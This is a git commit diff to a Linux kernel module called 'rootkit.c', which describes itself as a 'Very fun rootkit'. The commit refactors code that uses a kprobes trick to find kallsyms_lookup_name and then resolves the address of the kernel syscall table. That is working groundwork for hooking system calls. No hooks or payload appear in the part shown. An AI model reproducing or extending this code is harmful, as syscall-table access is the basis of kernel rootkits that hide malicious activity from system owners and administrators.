e6d4329c3d70c05b54fe160d98085d97301b7c28
Omri Ben Zikri <omribenzikri10@gmail.com>
2025-04-23 20:51:31 +0300

    Obtaining a pointer to the kernel syscall table

--- rootkit.c
+++ rootkit.c
@@ -3,14 +3,18 @@
 #include <linux/kernel.h>
 #include <linux/kprobes.h>
 #include <linux/string.h>
+#include <linux/unistd.h>
+#include <linux/version.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Omri Ben Zikri");
 MODULE_DESCRIPTION("Very fun rootkit");
 MODULE_VERSION("1.0.0");
 
-unsigned long lookup_kallsyms_lookup_name(void);
-unsigned long (*kln)(const char *name) = NULL;
+unsigned long locate_kallsyms_lookup_name(void);
+unsigned long *locate_syscall_table(void);
+
+unsigned long (*ksyms_lookup_name)(const char *name) = NULL;
 unsigned long *syscall_table = NULL;
 
 /* 
@@ -18,7 +22,7 @@ unsigned long *syscall_table = NULL;
     We can work around this by probing the kallsyms_lookup_name() with functions from kprobes.h
     One of the things that probing a function gives us is its memory address
 */
-unsigned long lookup_kallsyms_lookup_name()
+unsigned long locate_kallsyms_lookup_name(void)
 {
     struct kprobe kp;
     unsigned long addr;
@@ -36,23 +40,39 @@ unsigned long lookup_kallsyms_lookup_name()
     return addr;
 }
 
+/*
+    Looks up the address of the kernel syscall table.
+    Returns a pointer to the table if found, otherwise returns NULL.
+*/
+unsigned long *locate_syscall_table(void)
+{
+    unsigned long addr = ksyms_lookup_name("sys_call_table");
+    if (addr == 0) {
+        return NULL;
+    }
+    return (unsigned long *)addr;
+}
+
 
 // LKM initialization
 static int __init mod_init(void)
 {
     printk(KERN_INFO "rootkit: init\n");
 
-    unsigned long kln_addr = lookup_kallsyms_lookup_name();
+    // Locate 
+    unsigned long kln_addr = locate_kallsyms_lookup_name();
     if (kln_addr == 0) {
         printk(KERN_ERR "Failed to locate kallsyms_lookup_name :(\n");
-    } else {
-        printk(KERN_INFO "The address of kallsyms_lookup_name is: %lu\n", kln_addr);
+        return 1;
     }
-    kln = (unsigned long (*)(const char *name)) kln_addr;
-    
-    // Lookup the address of the kernel syscall table
-    unsigned long addr = kln("sys_call_table");
-    printk(KERN_INFO "The address of the syscall table is: %lu\n", addr);
+    ksyms_lookup_name = (unsigned long (*)(const char *name))kln_addr;
+
+    // Locate the syscall table
+    syscall_table = locate_syscall_table();
+    if (syscall_table == NULL) {
+        printk(KERN_ERR "Failed to locate sys_call_table :(\n");
+        return 1;
+    }
 
     return 0;
 }
